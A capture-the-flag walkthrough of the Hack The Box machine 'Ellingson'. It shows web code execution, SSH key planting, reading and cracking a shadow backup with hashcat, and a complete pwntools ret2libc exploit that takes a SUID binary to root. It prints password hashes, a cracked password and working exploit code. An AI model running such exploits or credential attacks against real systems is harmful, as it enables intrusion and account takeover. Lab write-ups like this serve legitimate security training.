nmap scan

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.139
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Enumerating port 80

We have this website:

![image1](/assets/images/htb-ellingson/ellingson1.png)

Going into details the url is like this:

```
http://10.10.10.139/articles/1
```

There are 3 articles, but if we go to `articles/4` we have this:

![image2](/assets/images/htb-ellingson/ellingson2.png)

We can execute python:

![image3](/assets/images/htb-ellingson/ellingson3.png)

We have access to the hal home directory:

![image4](/assets/images/htb-ellingson/ellingson4.png)

The `id_rsa` key is encrypted:

![image5](/assets/images/htb-ellingson/ellingson5.png)

### Getting a shell

I'm going to create ssh keys and put it on the authorized keys:

```bash
ssh-keygen -f keys -t rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):                                                    
Enter same passphrase again:                                                                   
Your identification has been saved in keys
Your public key has been saved in keys.pub
The key fingerprint is:     
SHA256:HTF8LYWoNIvgRgtnEIxJJRexAK1KzfaDVpdJ++gpbFo localuser@ubuntu
The key's randomart image is:
+---[RSA 3072]----+
|+O+Bo    .o. +.  |                                                                            
|o B *  .o oo+ .  |
| .oB o.o++.. .   |
|.. ++..=o. .     |
|o ..+ . S .      |
|.  o o . .       |
|  . .Eo .        |
|    .+ o         |
|   .o .          |
+----[SHA256]-----+
```

We copy the ouput of the `.pub` key and add it to authorized keys:

![image6](/assets/images/htb-ellingson/ellingson6.png)

Now we can login:

```bash
chmod 700 keys
ssh -i keys hal@10.10.10.139
```

### Enumerating as hal

```bash
id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

Hal is member of the `adm` group, I'll search for files owned by this group:

```bash
find / -group adm 2>/dev/null
/var/backups/shadow.bak
/var/spool/rsyslog
/var/log/auth.log
/var/log/mail.err
/var/log/fail2ban.log
/var/log/kern.log
/var/log/syslog
/var/log/nginx
/var/log/nginx/error.log
/var/log/nginx/access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/apt/term.log
/var/log/apport.log
/var/log/mail.log
/snap/core/6405/var/log/dmesg
/snap/core/6405/var/log/fsck/checkfs
/snap/core/6405/var/log/fsck/checkroot
/snap/core/6405/var/spool/rsyslog
/snap/core/4917/var/log/dmesg
/snap/core/4917/var/log/fsck/checkfs
/snap/core/4917/var/log/fsck/checkroot
/snap/core/4917/var/spool/rsyslog
/snap/core/6818/var/log/dmesg
/snap/core/6818/var/log/fsck/checkfs
/snap/core/6818/var/log/fsck/checkroot
/snap/core/6818/var/spool/rsyslog
```

We have a backups directory with a shadow.bak:

```bash
cat /var/backups/shadow.bak 
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

### Cracking hashes

We can crack the hashes using hashcat and `-m 1800` because the hashes are sha512crypt

```
.\hashcat.exe -m 1800 .\hash.txt .\rockyou.txt
```

And the we have `password123` that isn't useful and `iamgod$08` that we are going to use to ssh as margo

### Enumerating as margo

```bash
ssh margo@10.10.10.139
```

Looking for SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/at           
/usr/bin/newgrp           
/usr/bin/pkexec             
/usr/bin/passwd             
/usr/bin/gpasswd               
/usr/bin/garbage              
/usr/bin/newuidmap
---
---
---
```

`/usr/bin/garbage` isn't a common binary

```bash
/usr/bin/garbage 
Enter access password: asdasd

access denied.
```

I'll transfer it to my machine:

```bash
scp margo@10.10.10.139:/usr/bin/garbage .
```

### Exploiting the garbage binary

Running file against it it's a 64 bit binary, not stripped:

```bash
file garbage 
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

And checksec to see the protections:

```bash
checksec garbage
[*] '/home/localuser/htb/ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

If I send 200 chars I get a segmentation fault:

```bash
./garbage 
Enter access password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

access denied.
Segmentation fault (core dumped)
```

### Controlling RIP

First I'll find on how many bytes I have control over `RIP`, for this I'll use the the `cyclic()` function from pwntools to generate a cyclic pattern:

```python
python3
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaab
waabxaabyaab'
```

And I send it with gdb (I'm usign the pwndbg extension):

![image7](/assets/images/htb-ellingson/ellingson7.png)

```python
>>> cyclic_find(0x6261616a)
136
```

The offset is at 136 bytes

### Leaking the libc address

NX is enabled, so we have to use ROP techniques, we are going to perform a ret2libc, in which we are going to leak the libc address, for this we have to leak for example the real `puts` function.

First we need a gadget that pop `RDI`

```bash
ropper
(ropper)> file garbage
(garbage/ELF/x86_64)> gadgets
----
----
----
0x000000000040179b: pop rdi; ret;                                               
----
```

Next thing for leak the real `puts` function is to find the address of `puts` at plt and the pointer of `puts` at plt:

![image8](/assets/images/htb-ellingson/ellingson8.png)

And the address of main, that we need it at the end, because ASLR is enabled so it will be useful, because we can overflow it again knowing the libc address and use its functions, the exploit would be like this:

```python
from pwn import *

s = ssh(user="margo",password="iamgod$08",host="10.10.10.139")
p = s.run("/usr/bin/garbage")

# GADGETS
POP_RDI = p64(0x40179b)

# ADDRESSES
main = p64(0x401619)
puts_got = p64(0x404028)
puts_plt = p64(0x401050)

# 1 - Leaking libc address
payload = b"a"*136 #offset
payload += POP_RDI
payload += puts_got
payload += puts_plt
payload += main

p.recvuntil(":")
p.sendline(payload)
p.recvuntil("access denied.\n")

puts_leak = u64(p.recv()[:8].strip().ljust(8,b"\x00"))
log.info(f"PUTS LEAK: {hex(puts_leak)}")
```

When we run it we get this:

```bash
python3 exploit.py 
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: '/usr/bin/garbage': Done
[*] PUTS LEAK: 0x7f384daaf9c0
```

### With puts leaked, calculating addresses of the functions to be used

We have successfuly leaked puts, now take the last 3 bytes `9c0` and we'll use [here](https://libc.blukat.me/) to calculate the libc address:

![image9](/assets/images/htb-ellingson/ellingson9.png)

Click on all symbols and CTRL+F setuid

![image10](/assets/images/htb-ellingson/ellingson10.png)

Now if we substract our leak of `puts` to the offset of `puts` that is on libc, we have leaked the first libc address, if we want to use its function we only have to add the first libc address and the offset.

What we are going to do is: pop rdi, and set the it to 0, then call setuid, so we are root, then we pop_rdi and we set it to `/bin/sh` and call system and we have a shell

```python
glibc = puts_leak - 0x0809c0
glibc_system = glibc + 0x04f440
glibc_bin_sh = glibc + 0x1b3e9a
glibc_setuid = glibc + 0xe5970
```

### Final exploit

```python
from pwn import * 


s = ssh(user="margo",password="iamgod$08",host="10.10.10.139"                   
p = s.run("/usr/bin/garbage")

# GADGETS
pop_rdi = p64(0x40179b)

# ADDRESSES
main = p64(0x401619)
puts_got = p64(0x404028)
puts_plt = p64(0x401050)

# 1 - Leaking libc address
payload = b"a"*136 #offset
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main

p.recvuntil(":")
p.sendline(payload)
p.recvuntil("access denied.\n")

puts_leak = u64(p.recv()[:8].strip().ljust(8,b"\x00"))
log.info(f"PUTS LEAK: {hex(puts_leak)}")

glibc = puts_leak - 0x0809c0
glibc_system = glibc + 0x04f440
glibc_bin_sh = glibc + 0x1b3e9a
glibc_setuid = glibc + 0xe5970

# 2 - Getting a root shell

payload = b"a"*136
payload += pop_rdi
payload += p64(0)
payload += p64(glibc_setuid)
payload += pop_rdi
payload += p64(glibc_bin_sh)
payload += p64(glibc_system)

p.sendline(payload)
p.interactive()
```

After running it:

```bash
python3 exploit.py 
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: '/usr/bin/garbage': Done
[*] PUTS LEAK: 0x7fd6981d99c0
[*] Switching to interactive mode
Enter access password: 
access denied.
# $ whoami
root
```
